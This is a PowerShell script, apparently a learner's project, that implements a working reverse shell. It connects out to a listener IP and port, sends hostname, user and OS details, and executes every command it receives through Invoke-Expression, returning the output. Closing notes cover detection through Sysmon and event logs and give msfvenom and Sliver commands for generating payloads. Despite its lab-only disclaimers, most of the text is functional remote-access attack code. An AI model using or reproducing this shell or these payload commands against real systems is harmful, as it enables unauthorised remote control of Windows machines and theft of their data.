# ============================================================================
# Basic Reverse Shell - Educational Only!
# ============================================================================
#
# This is my simplified reverse shell for learning how they work.
# Spent like 3 hours figuring out the TCP stream stuff lol
#
# ⚠️  LAB ONLY - Don't be stupid with this
#
# What this does:
# - Connects back to my listener (reverse connection)
# - Gives me a PowerShell prompt on the target
# - Super basic, no fancy evasion or anything
#
# Why it sucks (intentionally):
# - No encryption - everything in plaintext
# - Windows Defender will probably catch it
# - Sysmon will light up like a Christmas tree
# - No obfuscation at all
# - Dies if connection drops
#
# For real pentests: Use Metasploit/Sliver, not this!
# This is just for understanding the basics
#
# ============================================================================

param(
    [Parameter(Mandatory=$true)]
    [string]$ListenerIP,

    [Parameter(Mandatory=$true)]
    [int]$ListenerPort
)

Write-Host "[*] Basic Reverse Shell - Lab Only" -ForegroundColor Cyan
Write-Host "[*] Connecting to: ${ListenerIP}:${ListenerPort}" -ForegroundColor Cyan
Write-Host "[!] Educational use only!" -ForegroundColor Yellow
Write-Host ""

# ============================================================================
# Step 1: Create the TCP connection back to my listener
# ============================================================================

Write-Host "[1] Connecting back to listener..." -ForegroundColor Green

try {
    # TCPClient is basically like making a phone call to the listener
    # If listener isn't running, this will fail immediately
    $client = New-Object System.Net.Sockets.TCPClient($ListenerIP, $ListenerPort)

    Write-Host "[+] Connected to ${ListenerIP}:${ListenerPort}" -ForegroundColor Green

} catch {
    Write-Host "[-] Connection failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Make sure listener is running first!" -ForegroundColor Yellow
    exit 1
}

# ============================================================================
# Step 2: Get the communication stream
# ============================================================================

Write-Host "[2] Setting up communication stream..." -ForegroundColor Green

# The stream is like a two-way pipe for sending/receiving data
# Took me a while to understand this part
$stream = $client.GetStream()

# Reader and Writer make it easier to work with the stream
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)

# AutoFlush = send data immediately (don't buffer it)
$writer.AutoFlush = $true

# ============================================================================
# Step 3: Send banner with system info
# ============================================================================

Write-Host "[3] Sending banner..." -ForegroundColor Green

# Grab basic info about the target machine
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption

# Create a nice banner (makes it look professional lol)
$banner = @"

====================================
CONNECTION ESTABLISHED - LAB SHELL
====================================
Hostname: $hostname
Username: $username
OS: $os
PowerShell: $($PSVersionTable.PSVersion)
Time: $(Get-Date)
====================================

Type 'help' for commands
Type 'exit' to disconnect

"@

# Send it over
$writer.WriteLine($banner)

Write-Host "[+] Banner sent" -ForegroundColor Green

# ============================================================================
# Step 4: Main command loop - this is where the magic happens
# ============================================================================

Write-Host "[4] Starting command loop..." -ForegroundColor Green
Write-Host "[*] Waiting for commands..." -ForegroundColor Cyan

# Infinite loop - keep running until 'exit' or connection dies
while ($true) {

    try {
        # ===================================================================
        # Receive command from listener
        # ===================================================================

        # Send the prompt (makes it look like a real shell)
        $writer.Write("PS $pwd> ")

        # Wait for a command - this blocks until we get something
        # ReadLine() waits until it gets a full line (until Enter is pressed)
        $command = $reader.ReadLine()

        # If command is empty or null, connection probably dropped
        if ($null -eq $command -or $command -eq "") {
            Write-Host "[-] Connection closed" -ForegroundColor Red
            break
        }

        Write-Host "[>] Got command: $command" -ForegroundColor Yellow

        # ===================================================================
        # Handle special commands
        # ===================================================================

        # Exit command - close connection cleanly
        if ($command -eq "exit") {
            $writer.WriteLine("[*] Closing connection...")
            Write-Host "[*] Exit command received" -ForegroundColor Yellow
            break
        }

        # Help command - show available commands
        if ($command -eq "help") {
            $helpText = @"

AVAILABLE COMMANDS:
-------------------
help           Show this help
exit           Close connection
cd <path>      Change directory
sysinfo        System information
<command>      Execute PowerShell command

EXAMPLES:
---------
whoami
Get-Process
ipconfig
netstat -an
Get-ChildItem C:\

NOTE: Just type any PowerShell command and it'll run

"@
            $writer.WriteLine($helpText)
            continue
        }

        # Sysinfo command - detailed system info
        if ($command -eq "sysinfo") {
            $sysinfo = @"

=== SYSTEM INFO ===
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
Domain: $env:USERDOMAIN
OS: $((Get-CimInstance Win32_OperatingSystem).Caption)
Arch: $env:PROCESSOR_ARCHITECTURE
PowerShell: $($PSVersionTable.PSVersion)
.NET: $([System.Runtime.InteropServices.RuntimeInformation]::FrameworkDescription)
Current Dir: $pwd
===================

"@
            $writer.WriteLine($sysinfo)
            continue
        }

        # CD command - change directory
        if ($command -match '^cd\s+(.+)$') {
            $newPath = $matches[1]
            try {
                Set-Location $newPath
                $writer.WriteLine("[+] Changed to: $pwd")
            } catch {
                $writer.WriteLine("[-] Error: $($_.Exception.Message)")
            }
            continue
        }

        # ===================================================================
        # Execute the PowerShell command
        # ===================================================================

        try {
            # Invoke-Expression runs the command as if typed in PowerShell
            # 2>&1 captures errors too, Out-String converts to text
            $result = Invoke-Expression $command 2>&1 | Out-String

            # If empty output, say something so user knows it worked
            if ([string]::IsNullOrWhiteSpace($result)) {
                $result = "[*] Command ran (no output)"
            }

        } catch {
            # If command fails, send the error message
            $result = "[-] Error:`n$($_.Exception.Message)"
        }

        # ===================================================================
        # Send result back to listener
        # ===================================================================

        # Send the command output
        $writer.WriteLine($result)
        $writer.WriteLine("")  # Empty line for readability

        Write-Host "[<] Sent output ($($result.Length) chars)" -ForegroundColor Cyan

    } catch {
        # Something went wrong in the loop - probably connection died
        Write-Host "[-] Loop error: $($_.Exception.Message)" -ForegroundColor Red
        break
    }
}

# ============================================================================
# Step 5: Cleanup and exit
# ============================================================================

Write-Host "[5] Cleaning up..." -ForegroundColor Green

# Close everything properly to avoid leaving stuff hanging
if ($writer) { $writer.Close() }
if ($reader) { $reader.Close() }
if ($stream) { $stream.Close() }
if ($client) { $client.Close() }

Write-Host "[+] Connection closed cleanly" -ForegroundColor Green
Write-Host "[*] Done" -ForegroundColor Cyan

# ============================================================================
# MY NOTES
# ============================================================================

<#

HOW THIS WORKS:

1. TCP CONNECTION:
   - TCPClient connects to listener (like making a phone call)
   - If listener isn't running, fails immediately
   - Connection stays open until closed or network dies

2. STREAMS:
   - Stream = two-way pipe for sending/receiving data
   - StreamReader reads incoming commands
   - StreamWriter sends back results

3. THE LOOP:
   - Wait for command (blocking - pauses here)
   - Execute it with Invoke-Expression
   - Send output back
   - Repeat forever (until exit)

4. INVOKE-EXPRESSION:
   - Runs PowerShell code dynamically
   - Super dangerous in prod (code injection vuln)
   - Fine for learning in isolated lab

WHY THIS IS SUPER EASY TO DETECT:

1. Process Level:
   - powershell.exe making network connections = major red flag
   - Shows up in Event Logs (Event ID 4688)
   - Sysmon will catch the network connection (Event ID 3)
   - Any decent EDR will flag this immediately

2. Network:
   - Outbound TCP connection to random IP
   - ALL TRAFFIC IN PLAINTEXT (can read everything in Wireshark)
   - No legitimate reason for PowerShell to do this

3. Behavior:
   - PowerShell running commands in a loop
   - Invoke-Expression = huge IOC (Indicator of Compromise)
   - Pattern matching will catch this fast

FOR REAL PENTESTS - DON'T USE THIS:

Use professional tools instead:

1. Metasploit Meterpreter:
   msfvenom -p windows/x64/meterpreter/reverse_https \
     LHOST=yourip LPORT=443 -f exe -o payload.exe

2. Sliver C2:
   generate --mtls yourdomain.com --os windows

3. Covenant/Empire for PowerShell (with proper OpSec)

WHY PRO TOOLS ARE BETTER:

- Encrypted comms (HTTPS, mTLS)
- Built-in evasion and obfuscation
- Session management
- Post-exploitation features
- Client-accepted tools
- Proper logging for reports

THINGS TO TRY:

- Run Wireshark while using this - you'll see EVERYTHING in plaintext
- Turn on Windows Defender - see how fast it catches it
- Compare with Meterpreter's encrypted traffic
- Learn Sysmon rules for detecting this stuff
- Read ../detection/detection-guide.md to see the blue team perspective

TODO: Maybe try adding basic XOR encryption later?

#>
